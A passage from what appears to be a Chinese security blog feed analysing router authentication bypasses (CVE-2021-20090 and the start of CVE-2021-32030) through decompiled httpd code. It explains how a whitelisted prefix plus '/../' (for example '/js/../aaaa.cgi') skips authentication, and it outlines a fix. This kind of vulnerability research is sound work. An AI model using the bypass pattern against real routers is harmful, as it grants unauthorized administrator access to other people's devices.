* v9) + <span class="number">28</span>));</span><br><span class="line">          <span class="keyword">if</span> ( matched )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v9 == <span class="number">10</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">......</span><br><span class="line">       </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>主函数中会利用线程来接收request，线程实现函数为sub_D6E8</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn sub_D6E8(_DWORD *<span class="built_in">id</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">int</span> req; // r5</span><br><span class="line">  <span class="built_in">int</span> v2; // r2</span><br><span class="line">  signed <span class="built_in">int</span> v3; // r4</span><br><span class="line">  <span class="built_in">int</span> v4; // r3</span><br><span class="line">  <span class="built_in">int</span> v5; // r0</span><br><span class="line">  FILE *v6; // r0</span><br><span class="line">  FILE **i; // r4</span><br><span class="line">  _DWORD *v8; // r0</span><br><span class="line">  <span class="built_in">int</span> *v9; // r0</span><br><span class="line"></span><br><span class="line">  req = *(dword_614FC + <span class="number">4</span> * *<span class="built_in">id</span>);</span><br><span class="line">  printf(<span class="string">"[%s] thread #%d start ...\\n"</span>, <span class="string">"httpd_child"</span>, *<span class="built_in">id</span>);</span><br><span class="line">  sub_D6A0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( sem_wait((req + <span class="number">31664</span>)) == -<span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v2 = *_errno_location();</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">4</span> )</span><br><span class="line">      {</span><br><span class="line">        printf(<span class="string">"[%s] sem_wait err: %d"</span>, <span class="string">"httpd_child"</span>, v2);</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    printf(<span class="string">"[%s] thread %d wake up\\n"</span>, <span class="string">"httpd_child"</span>, *(req + <span class="number">28</span>));// req-&gt;<span class="built_in">id</span></span><br><span class="line">    pthread_mutex_lock(req);</span><br><span class="line">    pthread_mutex_unlock(req);</span><br><span class="line">    v3 = *(req + <span class="number">56</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      sub_C1E8((req + <span class="number">120</span>), *(req + <span class="number">56</span>));</span><br><span class="line">      v4 = *(req + <span class="number">32</span>);</span><br><span class="line">      *(req + <span class="number">184</span>) = v4;</span><br><span class="line">      *(req + <span class="number">124</span>) = v4;</span><br><span class="line">      *(req + <span class="number">120</span>) = *(req + <span class="number">28</span>);               // req-&gt;<span class="built_in">id</span></span><br><span class="line">      sub_EC94(req + <span class="number">120</span>);</span><br><span class="line">      sub_ED84(req + <span class="number">120</span>);</span><br><span class="line">      v5 = sub_C008(req + <span class="number">120</span>, v3, (req + <span class="number">333</span>), <span class="number">10000</span>, <span class="number">1000</span> * dword_619BC);// 获取http请求的完整头部</span><br><span class="line">      *(req + <span class="number">10336</span>) = v5;                      // req-&gt;flags</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        request_log(*(req + <span class="number">184</span>), dword_619BC, sub_14CE8);</span><br><span class="line">        request_handle(req + <span class="number">120</span>);</span><br><span class="line">        sub_15B88(*(req + <span class="number">184</span>));</span><br><span class="line">        so_flush(req + <span class="number">120</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == -<span class="number">2</span> )</span><br><span class="line">      {</span><br><span class="line">        LOG(req + <span class="number">120</span>, <span class="number">500</span>, <span class="string">"Unable to process request headers"</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    close(*(req + <span class="number">132</span>));</span><br><span class="line">    v6 = *(req + <span class="number">136</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      sub_E360(v6);</span><br><span class="line">    <span class="keyword">for</span> ( i = *(req + <span class="number">140</span>); i; *(req + <span class="number">140</span>) = i )</span><br><span class="line">    {</span><br><span class="line">      sub_E360(*i);</span><br><span class="line">      v8 = *(req + <span class="number">140</span>);</span><br><span class="line">      i = v8[<span class="number">1</span>];</span><br><span class="line">      free(v8);</span><br><span class="line">    }</span><br><span class="line">    printf(<span class="string">"[%s] thread %d work finished\\n\\n"</span>, <span class="string">"httpd_child"</span>, *(req + <span class="number">28</span>));</span><br><span class="line">    pthread_mutex_lock(req);</span><br><span class="line">    *(req + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(req);</span><br><span class="line">    <span class="keyword">if</span> ( sem_post(&amp;stru_614EC) == -<span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v9 = _errno_location();</span><br><span class="line">      printf(<span class="string">"[%s] sem_post %d err: %d\\n"</span>, <span class="string">"httpd_child"</span>, *(req + <span class="number">28</span>), *v9);</span><br><span class="line">LABEL_16:</span><br><span class="line">      pthread_exit(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里没有修复出结构体，看起来很杂乱，打注释分析</p><p>如果线程被启动代表已经有数据来了，此时给一个id，这个id里存放着这次发送的数据</p><p>接着判断这个id里的数据是否能正常获取完整的头部</p><p>如果可以获取则调用request_log这几个函数来处理此次请求</p><p>重要的是request_handle函数，这里对请求数据进行解析+权限认证+执行对应的请求</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall request_handle(<span class="built_in">int</span> a1)</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">int</span> v2; // r5</span><br><span class="line">  const char *v3; // r8</span><br><span class="line">  _BYTE *v4; // r10</span><br><span class="line">  <span class="built_in">int</span> v5; // r0</span><br><span class="line">  <span class="built_in">int</span> (__fastcall *v6)(<span class="built_in">int</span>); // r3</span><br><span class="line">  const char *v7; // r5</span><br><span class="line"></span><br><span class="line">  v2 = a1 + <span class="number">213</span>;</span><br><span class="line">  *(a1 + <span class="number">10224</span>) = sub_16A84(a1 + <span class="number">213</span>, <span class="number">13</span>);</span><br><span class="line">  *(a1 + <span class="number">30372</span>) = -<span class="number">1</span>;</span><br><span class="line">  *(a1 + <span class="number">30380</span>) = -<span class="number">1</span>;</span><br><span class="line">  v3 = sub_16A84(v2, <span class="string">' '</span>);</span><br><span class="line">  *(a1 + <span class="number">31512</span>) = v2;                           // req-&gt;method</span><br><span class="line">  v4 = sub_16A84(v3, <span class="string">' '</span>);</span><br><span class="line">  *(a1 + <span class="number">31508</span>) = sub_16A84(v3, <span class="string">'?'</span>);           // req-&gt;args</span><br><span class="line">  strncpy((a1 + <span class="number">31124</span>), v3, 0xFFu);             // req-&gt;url</span><br><span class="line">  *(a1 + <span class="number">31379</span>) = <span class="number">0</span>;</span><br><span class="line">  url_decode(a1 + <span class="number">31124</span>);                       // req-&gt;url</span><br><span class="line">  printf(<span class="string">"[%s] url=[%s], args=[%s], method=[%s]\\n"</span>, <span class="string">"process_request"</span>, (a1 + <span class="number">31124</span>), *(a1 + <span class="number">31508</span>), *(a1 + <span class="number">31512</span>));</span><br><span class="line">  <span class="keyword">if</span> ( init(a1) &gt;= <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( *v4 )</span><br><span class="line">    {</span><br><span class="line">      *(a1 + <span class="number">31112</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( body_parm(a1) &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">if</span> ( strncasecmp(*(a1 + <span class="number">30240</span>), <span class="string">"multipart/form-data"</span>, 0x13u) )// req-&gt;Content-<span class="built_in">type</span></span><br><span class="line">      {</span><br><span class="line">        v5 = *(a1 + <span class="number">31524</span>);                     // req-&gt;SOAPAction</span><br><span class="line">        <span class="keyword">if</span> ( v5 )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( !strcasestr(v5, <span class="string">"FirmwareUpload"</span>) &amp;&amp; *(a1 + <span class="number">31104</span>) &gt; <span class="number">64000</span> )// Content-length &gt; <span class="number">64000</span></span><br><span class="line">          {</span><br><span class="line">            sub_BEF4(a1, *(a1 + <span class="number">12</span>));</span><br><span class="line">            LOG(a1, <span class="number">403</span>, <span class="string">"The Content-length is extreme large!"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *(a1 + <span class="number">31112</span>) = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    *(a1 + <span class="number">30376</span>) = sub_DEB0(a1 + <span class="number">31124</span>);       // req-&gt;is_url_valid = req-&gt;url; 判断url是否在一个预定义表中</span><br><span class="line">    v6 = *(off_54FAC[<span class="number">0</span>] + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (!v6 || v6(a1) != <span class="number">2</span>) &amp;&amp; (*(a1 + <span class="number">30376</span>) || !check_auth(a1 + <span class="number">31124</span>, <span class="number">0</span>, a1)) )</span><br><span class="line">    {</span><br><span class="line">      *(a1 + <span class="number">31116</span>) = <span class="number">0</span>;</span><br><span class="line">      v7 = *(a1 + <span class="number">31512</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !strcmp(v7, <span class="string">"HEAD"</span>) )</span><br><span class="line">      {</span><br><span class="line">        *(a1 + <span class="number">31116</span>) = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(a1 + <span class="number">31112</span>) )</span><br><span class="line">        {</span><br><span class="line">          *(a1 + <span class="number">31116</span>) = <span class="number">0</span>;</span><br><span class="line">          LOG(a1, <span class="number">400</span>, <span class="string">"Invalid HTTP/0.9 method."</span>);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        goto LABEL_19;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( !strcmp(v7, <span class="string">"GET"</span>) )</span><br><span class="line">      {</span><br><span class="line">LABEL_19:</span><br><span class="line">        process_get(a1);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( !strcmp(v7, <span class="string">"POST"</span>) )</span><br><span class="line">        process_post(a1);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        LOG(a1, <span class="number">400</span>, <span class="string">"Invalid or unsupported method."</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>进行初步解析，解析出method，args，url</p><p>然后把url进行解码，并初始化一些东西</p><p>请求的主体数据会被body_parm进行解析，并存入相应的地方</p><p>检查Content-Length是否过大</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall sub_DEB0(const char *a1)</span><br><span class="line">{</span><br><span class="line">  const char *v2; // r4</span><br><span class="line">  char **i; // r5</span><br><span class="line">  size_t v5; // r0</span><br><span class="line">  const char *v6; // t1</span><br><span class="line"></span><br><span class="line">  v2 = off_54F70[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !off_54F70[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = off_54F70; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    v5 = strlen(v2);</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(a1, v2, v5) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = i[<span class="number">1</span>];</span><br><span class="line">    v2 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>调用sub_DEB0函数来确认url是否是预定义表中的，如果是则req-&gt;is_url_valid=1</p><p>有个特别重要的点是如果req-&gt;is_url_valid=1，那么就不会进行check_auth，也就是权限认证</p><p>接着通过method进入不同的处理</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall process_post(<span class="built_in">int</span> a1)</span><br><span class="line">{</span><br><span class="line">  const char *path; // r4</span><br><span class="line"></span><br><span class="line">  path = (a1 + <span class="number">31124</span>);</span><br><span class="line">  printf(<span class="string">"[%s] path: %s, args: %s\\n"</span>, <span class="string">"process_post"</span>, (a1 + <span class="number">31124</span>), *(a1 + <span class="number">31508</span>));</span><br><span class="line">  switch ( sub_DF50(path) )</span><br><span class="line">  {</span><br><span class="line">    case -<span class="number">1</span>:</span><br><span class="line">      LOG(a1, <span class="number">302</span>, path);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    case <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !sub_14F9C(a1) )</span><br><span class="line">        LOG(a1, <span class="number">501</span>, <span class="string">"POST to non-script"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    case <span class="number">2</span>:</span><br><span class="line">      sub_158D0(a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    case <span class="number">3</span>:</span><br><span class="line">      LOG(a1, <span class="number">400</span>, path);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    default:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看一下process_post函数</p><p>会将url放入sub_DF50函数，这个函数会对url进行一些操作</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall sub_DF50(const char *path)</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">int</span> v2; // r3</span><br><span class="line">  <span class="built_in">bool</span> v3; // zf</span><br><span class="line">  <span class="built_in">int</span> i; // r4</span><br><span class="line">  <span class="built_in">int</span> v5; // r7</span><br><span class="line">  size_t v6; // r6</span><br><span class="line"></span><br><span class="line">  sub_167A8(path);</span><br><span class="line">  v2 = *path;</span><br><span class="line">  v3 = v2 == <span class="string">'/'</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="string">'/'</span> )</span><br><span class="line">    v3 = v2 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">528</span>; i += <span class="number">66</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( sub_17584(dword_619C0 + i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = dword_619C0 + i;</span><br><span class="line">    v6 = strlen((dword_619C0 + i));</span><br><span class="line">    <span class="keyword">if</span> ( !strncmp(path, (dword_619C0 + i), v6) &amp;&amp; (*(v5 + v6 - <span class="number">1</span>) == <span class="string">'/'</span> || v6 == strlen(path) || path[v6] == <span class="string">'/'</span>) )</span><br><span class="line">    {</span><br><span class="line">      sub_166D8(v6, path, (v5 + <span class="number">32</span>));</span><br><span class="line">      <span class="keyword">return</span> *(dword_619C0 + i + <span class="number">64</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  sub_166D8(<span class="number">0</span>, path, dword_61648);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>url会传入sub_167A8中</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall sub_167A8(char *path)</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">int</span> <span class="built_in">id</span>; // r2</span><br><span class="line">  <span class="built_in">int</span> idx; // r3</span><br><span class="line">  char *v3; // r12</span><br><span class="line">  <span class="built_in">int</span> v4; // r2</span><br><span class="line">  <span class="built_in">bool</span> v5; // zf</span><br><span class="line">  <span class="built_in">int</span> v6; // r5</span><br><span class="line">  char *v7; // r1</span><br><span class="line">  <span class="built_in">int</span> v8; // r2</span><br><span class="line">  <span class="built_in">int</span> v9; // t1</span><br><span class="line"></span><br><span class="line">  <span class="built_in">id</span> = <span class="number">0</span>;</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( path[idx] )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( double_dot[<span class="built_in">id</span>] == path[idx] )          // 判断是否为.</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( double_dot[++<span class="built_in">id</span>] )</span><br><span class="line">      {</span><br><span class="line">        ++idx;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v3 = &amp;path[idx + <span class="number">1</span>];                    // 指向..的下一个地方</span><br><span class="line">        v4 = *v3;</span><br><span class="line">        v5 = v4 == <span class="string">'/'</span>;                         // 判断下一个字节是否是/</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="string">'/'</span> )</span><br><span class="line">          v5 = v4 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )                               // 如果下一个字节是/</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( idx &lt;= <span class="number">3</span> || path[idx - <span class="number">2</span>] == <span class="string">'/'</span> )// url长度小于等于<span class="number">3</span>，或者存在/..</span><br><span class="line">          {</span><br><span class="line">            v6 = idx + <span class="number">1</span>;                       // ..的下一个字节</span><br><span class="line">            idx -= <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> )</span><br><span class="line">            {</span><br><span class="line">              <span class="keyword">for</span> ( ; idx &amp;&amp; path[idx] != <span class="string">'/'</span>; --idx )// 倒退，直到找到/</span><br><span class="line">                ;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              idx = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">            v7 = &amp;path[idx];                    // url开始的地方</span><br><span class="line">            v8 = path[v6];                      // ..的下一个字节</span><br><span class="line">            path[idx] = v8;                     // 将..下一个字节放到开头</span><br><span class="line">            <span class="keyword">if</span> ( v8 )                           // 把后续的东西都拷贝到前面，比如/api/../ppp，变成/ppp</span><br><span class="line">            {</span><br><span class="line">              do</span><br><span class="line">              {</span><br><span class="line">                v9 = *++v3;</span><br><span class="line">                *++v7 = v9;</span><br><span class="line">              }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>漏洞点就存在这个函数中</p><p>举个例子，这个函数会把/api/../ppp给转换成/ppp</p><p>那么结合上面，将url前放入预定义的数据，后面接上/../xxx，就不需要认证即可访问xxx，造成认证绕过漏洞。例如：/js/../aaaa.cgi</p><p>sub_DF50函数结束之后就会跑到sub_158D0中去执行对应的程序</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>像上一个ASUS的url检查一样，直接搬掉..</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;CVE-2021-20090-ASUS身份验证绕过&quot;&gt;&lt;a href=&quot;#CVE-2021-20090-ASUS身份验证绕过&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-20090 AS</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.z1r0.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-32030 ASUS身份验证绕过</title>
    <link href="https://www.z1r0.top/2023/08/29/CVE-2021-32030-ASUS%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"/>
    <id>https://www.z1r0.top/2023/08/29/CVE-2021-32030-ASUS%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</id>
    <published>2023-08-29T08:08:31.000Z</published>
    <updated>2023-08-29T08:27:21.249Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="CVE-2021-32030-ASUS身份验证绕过"><a href="#CVE-2021-32030-ASUS身份验证绕过" class="headerlink" title="CVE-2021-32030 ASUS身份验证绕过"></a>CVE-2021-32030 ASUS身份验证绕过</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>The administrator application on ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator interface. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of ‘\0’ matches the device’s default value of ‘\0’ in some situations.</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>固件下载链接：<a href="https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip">https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip</a></p><p>固件下载完成之后直接binwalk解包会出现<code>100000.ubi</code>，用<code>ubireader_extract_files</code>就可以继续解包</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubireader_extract_files 100000.ubi</span><br><span class="line">ubireader_extract_files`直接用pip安装就行`pip3 install ubi_reader</span><br></pre></td></tr></tbody></table></figure><p>ASUS之前发布了路由器相关的源码，可以通过源码来辅助分析，笔者在学习这个CVE的时候发现源码和固件的httpd很多地方都是一样的，这里主要分析一下它的<code>handle_request</code></p><p>直接strings搜索Bad Request，然后交叉引用就可以找到了，<code>sub_5FFDC</code>函数就是<code>handle_request</code></p><p>首先会获取第一行的数据，例如：<code>POST /goform/setsys HTTP/1.1\\r\\n</code></p><p>然后切割第一行的数据，切割成<code>line = method = POST, path=/goform/setsys, protocol=HTTP/1.1</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">host_name = <span class="number">0</span>;</span><br><span class="line"> <span class="built_in">memset</span>(line, <span class="number">0</span>, <span class="keyword">sizeof</span>(line));</span><br><span class="line"> <span class="keyword">if</span> ( !fgets(line, <span 